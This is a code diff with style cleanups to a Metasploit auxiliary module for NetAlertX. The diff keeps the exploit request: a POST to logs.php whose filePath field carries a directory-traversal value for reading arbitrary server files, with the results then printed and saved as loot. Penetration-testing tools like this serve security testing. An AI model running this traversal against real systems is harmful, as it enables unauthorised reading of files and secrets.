@@ -46,7 +46,7 @@ class MetasploitModule < Msf::Auxiliary
     })
     return Exploit::CheckCode::Unknown unless res&.code == 200
 
-    html_document = res&.get_html_document
+    html_document = res.get_html_document
     return Exploit::CheckCode::Unknown('Failed to get html document.') if html_document.blank?
 
     version_element = html_document.xpath('//div[text()="Installed version"]//following-sibling::*')
@@ -68,7 +68,7 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri('/php/components/logs.php'),
       'vars_post' =>
       {
-        'items' => "[{\"buttons\":[{\"labelStringCode\":\"Maint_PurgeLog\",\"event\":\"logManage(app.log, cleanLog)\"},{\"labelStringCode\":\"Maint_RestartServer\",\"event\":\"askRestartBackend()\"}],\"fileName\":\"#{dummyfilename}\",\"filePath\":\"#{traversal}#{filepath}\",\"textAreaCssClass\":\"logs\"}]"
+        'items' => %([{"buttons":[{"labelStringCode":"Maint_PurgeLog","event":"logManage(app.log, cleanLog)"},{"labelStringCode":"Maint_RestartServer","event":"askRestartBackend()"}],"fileName":"#{dummyfilename}","filePath":"#{traversal}#{filepath}","textAreaCssClass":"logs"}])
 
       }
     })
@@ -77,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
     fail_with Failure::NotVulnerable, 'Unexpected response code' unless res&.code == 200
     fail_with Failure::NotVulnerable, 'Unexpected response' if res&.body.blank?
 
-    html = res&.get_html_document
+    html = res.get_html_document
 
     fail_with Failure::NotVulnerable, 'No HTML body' if html.blank?
 
@@ -87,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status 'Received data:'
     print_status log_data.text
 
-    store_loot(
+    loot_path = store_loot(
       'netalert.results',
       'text/plain',
       ip,
@@ -95,8 +95,6 @@ class MetasploitModule < Msf::Auxiliary
       "netalert-#{filepath}.txt",
       'NetAlertX'
     )
-
-    print_status "Stored results in netalert-#{filepath}.txt"
+    print_status "Stored results in #{loot_path}"
   end
-
 end
